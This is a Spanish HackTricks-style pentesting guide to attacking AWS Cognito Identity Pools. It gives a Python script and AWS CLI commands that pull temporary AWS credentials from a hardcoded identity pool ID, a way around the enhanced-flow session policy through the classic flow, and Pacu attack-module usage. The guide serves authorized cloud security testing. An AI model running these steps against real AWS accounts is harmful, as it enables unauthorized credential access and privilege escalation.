# Pools de Identidad de Cognito

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Informaci贸n B谩sica

Los pools de identidad desempe帽an un papel crucial al permitir que tus usuarios **adquieran credenciales temporales**. Estas credenciales son esenciales para acceder a varios servicios de AWS, incluidos, pero no limitados a Amazon S3 y DynamoDB. Una caracter铆stica notable de los pools de identidad es su soporte tanto para usuarios an贸nimos como para una variedad de proveedores de identidad para la autenticaci贸n de usuarios. Los proveedores de identidad admitidos incluyen:

- Pools de usuarios de Amazon Cognito
- Opciones de inicio de sesi贸n social como Facebook, Google, Iniciar sesi贸n con Amazon e Iniciar sesi贸n con Apple
- Proveedores compatibles con OpenID Connect (OIDC)
- Proveedores de identidad SAML (Security Assertion Markup Language)
- Identidades autenticadas por desarrolladores
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Para generar sesiones de Identity Pool, primero necesitas **generar un ID de identidad**. Este ID de identidad es la **identificaci贸n de la sesi贸n de ese usuario**. Estas identificaciones pueden tener hasta 20 conjuntos de datos que pueden almacenar hasta 1 MB de pares clave-valor.

Esto es **煤til para mantener informaci贸n de un usuario** (que siempre estar谩 utilizando el mismo ID de identidad).

Adem谩s, el servicio **cognito-sync** es el servicio que permite **administrar y sincronizar esta informaci贸n** (en los conjuntos de datos, enviando informaci贸n en streams y mensajes SNS...).

### Herramientas para pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), el marco de explotaci贸n de AWS, ahora incluye los m贸dulos "cognito\_\_enum" y "cognito\_\_attack" que automatizan la enumeraci贸n de todos los activos de Cognito en una cuenta y se帽alan configuraciones d茅biles, atributos de usuario utilizados para el control de acceso, etc., y tambi茅n automatizan la creaci贸n de usuarios (incluido el soporte de MFA) y la escalada de privilegios basada en atributos personalizables modificables, credenciales de pool de identidades utilizables, roles asumibles en tokens de identidad, etc.

Para obtener una descripci贸n de las funciones de los m贸dulos, consulta la parte 2 de la [publicaci贸n del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para instrucciones de instalaci贸n, consulta la p谩gina principal de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Uso

Uso de muestra de cognito\_\_attack para intentar la creaci贸n de usuarios y todos los vectores de escalada de privilegios contra un pool de identidades y un cliente de pool de usuarios espec铆ficos:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Ejemplo de uso de cognito\_\_enum para recopilar todos los grupos de usuarios, clientes de grupos de usuarios, grupos de identidades, usuarios, etc. visibles en la cuenta actual de AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) es una herramienta CLI en python que implementa diferentes ataques en Cognito, incluyendo la creaci贸n no deseada de cuentas y la escalada de pool de identidades.

#### Instalaci贸n
```bash
$ pip install cognito-scanner
```
#### Uso
```bash
$ cognito-scanner --help
```
Para obtener m谩s informaci贸n, visita https://github.com/padok-team/cognito-scanner

## Accediendo a Roles de IAM

### No autenticado

Lo 煤nico que un atacante necesita saber para **obtener credenciales de AWS** en una aplicaci贸n Cognito como usuario no autenticado es el **ID del grupo de identidades**, y este **ID debe estar codificado** en la **aplicaci贸n** web/m贸vil para que la use. Un ID se ve as铆: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (no se puede forzar por fuerza bruta).

{% hint style="success" %}
El **rol no autenticado de IAM Cognito creado a trav茅s de** se llama por defecto `Cognito_<Nombre del grupo de identidades>Unauth_Role`
{% endhint %}

Si encuentras un ID de Grupo de Identidades codificado y permite usuarios no autenticados, puedes obtener credenciales de AWS con:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
O puedes usar los siguientes **comandos de aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Ten en cuenta que por defecto, un **usuario de Cognito no autenticado NO PUEDE tener ning煤n permiso, incluso si se le asign贸 mediante una pol铆tica**. Verifica la siguiente secci贸n.
{% endhint %}

### Flujo de autenticaci贸n mejorado vs b谩sico

La secci贸n anterior sigui贸 el **flujo de autenticaci贸n mejorado por defecto**. Este flujo establece una **pol铆tica de sesi贸n restrictiva** [**pol铆tica de sesi贸n**](../../aws-basic-information/#session-policies) para la sesi贸n de rol IAM generada. Esta pol铆tica solo permitir谩 que la sesi贸n [**utilice los servicios de esta lista**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (incluso si el rol ten铆a acceso a otros servicios).

Sin embargo, hay una forma de evitar esto, si el **pool de identidades tiene habilitado el "Flujo B谩sico (Cl谩sico)"**, el usuario podr谩 obtener una sesi贸n utilizando ese flujo que **no tendr谩 esa pol铆tica de sesi贸n restrictiva**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si recibes este **error**, es porque el **flujo b谩sico no est谩 habilitado (por defecto)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Teniendo un conjunto de credenciales IAM, debes verificar [qu茅 acceso tienes](../../#whoami) e intentar [escalar privilegios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Recuerda que los **usuarios autenticados** probablemente tendr谩n **permisos diferentes**, as铆 que si puedes **registrarte dentro de la aplicaci贸n**, intenta hacerlo y obtener las nuevas credenciales.
{% endhint %}

Tambi茅n podr铆a haber **roles** disponibles para **usuarios autenticados que acceden al Grupo de Identidad**.

Para esto es posible que necesites acceso al **proveedor de identidad**. Si ese es un **Grupo de Usuarios de Cognito**, tal vez puedas abusar del comportamiento por defecto y **crear un nuevo usuario t煤 mismo**.

{% hint style="success" %}
El **rol autenticado IAM Cognito creado a trav茅s de** se llama por defecto `Cognito_<Nombre del Grupo de Identidad>Auth_Role`
{% endhint %}

De todas formas, el **siguiente ejemplo** espera que ya hayas iniciado sesi贸n dentro de un **Grupo de Usuarios de Cognito** utilizado para acceder al Grupo de Identidad (no olvides que tambi茅n podr铆an estar configurados otros tipos de proveedores de identidad).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_ID_GRUPO_USUARIOS>=&#x3C;TOKEN_ID>

# Obt茅n el identity_id de la respuesta del comando anterior
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_ID_GRUPO_USUARIOS>=&#x3C;TOKEN_ID>


# En el IdToken puedes encontrar los roles a los que un usuario tiene acceso debido a los Grupos de Usuarios del Grupo
# Usa --custom-role-arn para obtener credenciales para un rol espec铆fico
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_ID_GRUPO_USUARIOS>=&#x3C;TOKEN_ID>
</code></pre>

{% hint style="warning" %}
Es posible **configurar diferentes roles IAM dependiendo del proveedor de identidad** con el que el usuario est谩 iniciando sesi贸n o incluso solo dependiendo **del usuario** (usando claims). Por lo tanto, si tienes acceso a diferentes usuarios a trav茅s del mismo o diferentes proveedores, podr铆a valer la pena **iniciar sesi贸n y acceder a los roles IAM de todos ellos**.
{% endhint %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
